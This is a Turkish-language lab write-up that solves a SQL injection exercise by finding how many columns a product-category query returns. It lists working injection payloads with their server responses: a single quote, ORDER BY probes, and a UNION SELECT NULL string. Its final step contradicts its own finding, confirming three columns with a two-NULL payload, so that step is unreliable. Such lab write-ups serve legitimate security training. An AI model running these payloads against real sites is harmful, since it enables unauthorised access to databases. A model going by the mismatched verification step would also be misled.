# Lab: SQL injection UNION attack, determining the number of columns returned by the query

## Görev Özeti
Bu laboratuvarda, ürün kategorisi filtresindeki bir SQL enjeksiyon zafiyetini kullanarak orijinal sorgunun kaç sütun döndürdüğünü tespit etmemiz isteniyor.

## Çözüm Adımları

### Adım 1: Enjeksiyon Noktasını Belirleme
Hangi parametrenin savunmasız olduğunu anlamak için kategori filtresine bir tek tırnak (`'`) ekliyorum.

### Adım 2: Sütun Sayısını Tespit Etme (ORDER BY)
Veritabanını sütun numarasına göre sıralamaya zorlayarak sınırları test ediyorum:
- `GET /filter?category=Gifts' ORDER BY 1--` -> 200 OK
- `GET /filter?category=Gifts' ORDER BY 2--` -> 200 OK
- `GET /filter?category=Gifts' ORDER BY 3--` -> 200 OK
- `GET /filter?category=Gifts' ORDER BY 4--` -> 500 Internal Server Error

**Sonuç:** 4. sütunda hata aldığım için orijinal sorgunun **3 sütun** döndürdüğünü anlıyorum.

### Adım 3: Doğrulama (UNION SELECT)
Bulduğum sonucu `NULL` değerleri ile teyit ediyorum:
`' UNION SELECT NULL, NULL --`

Bu payload sorunsuz çalıştığında lab tamamlanmış oluyor.
